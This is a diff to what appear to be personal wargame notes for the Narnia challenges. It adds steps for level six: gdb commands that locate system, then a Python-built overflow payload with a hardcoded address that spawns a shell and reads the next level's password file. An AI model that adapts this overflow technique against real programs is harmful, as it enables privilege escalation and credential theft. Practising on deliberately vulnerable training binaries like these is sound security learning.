@@ -88,8 +88,17 @@ vim narnia5.c
 whoami
 cat /etc/narnia_pass/narnia6
 
-
-
+# narnia6 -> narnia7
+vim narnia6.c
+gdb -q narnia6
+disassemble main
+b main
+r
+p system
+q
+./narnia6 $(python -c 'print "sh;#" + "A"*4 + "\x70\x0e\xe6\xf7"' ) B
+whoami 
+cat /etc/narnia_pass/narnia7
 
 
 
